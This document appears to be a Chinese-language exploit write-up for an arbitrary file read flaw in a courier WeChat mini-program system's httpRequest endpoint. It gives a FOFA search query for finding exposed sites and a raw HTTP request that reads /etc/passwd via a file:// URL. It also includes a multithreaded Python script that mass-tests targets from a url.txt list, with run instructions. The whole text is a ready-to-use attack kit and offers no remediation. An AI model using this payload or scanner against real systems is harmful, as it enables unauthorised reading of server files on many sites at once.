# 快递微信小程序系统httpRequest任意文件读取漏洞

fofa:

```
body="static/default/newwap/lang/js/jquery.localize.min.js"
```

poc:

```
GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
```

批量检测脚本:

```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from urllib.parse import urlparse

def is_valid_url(url):
    """检查 URL 是否有效"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def add_protocol(url):
    """为 URL 添加 HTTP 协议头"""
    if not url.startswith('http'):
        return 'http://' + url
    return url

def test_vulnerability(url):
    """测试 URL 是否存在漏洞"""
    full_url = f"{url}/weixin/index/httpRequest?url=file:///etc/passwd"
    
    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] 可能存在的漏洞url: {url}")
        else:
            print(f" Not vulnerable: {url} (Status Code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f" Error testing {url}: {str(e)}")

def main():
    urls = []
    with open("url.txt", "r") as file:
        for line in file:
            url = line.strip()
            if is_valid_url(url):
                urls.append(url)
            else:
                # 尝试修复 URL
                fixed_url = add_protocol(url)
                if is_valid_url(fixed_url):
                    urls.append(fixed_url)
                else:
                    print(f"[-] Invalid URL: {url}")

    # 使用线程池执行任务
    max_workers = 10  # 可以根据系统资源调整线程数量
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_vulnerability, url): url for url in urls}
        
        for future in as_completed(futures):
            url = futures[future]
            try:
                data = future.result()
            except Exception as exc:
                print(f" Error occurred while testing {url}: {exc}")

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"\n--- Total time taken: {end_time - start_time:.2f} seconds ---")
```

使用方法:

```
python poc.py
同目录下保存一个url.txt
```

